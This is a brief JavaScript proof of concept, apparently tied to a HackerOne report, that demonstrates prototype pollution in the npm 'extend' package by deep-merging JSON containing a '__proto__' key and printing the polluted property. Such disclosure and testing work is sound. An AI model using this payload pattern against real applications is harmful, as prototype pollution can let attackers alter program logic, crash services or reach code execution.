//https://hackerone.com/reports/381185
let extend = require('extend');

extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));

console.log({}.polluted)
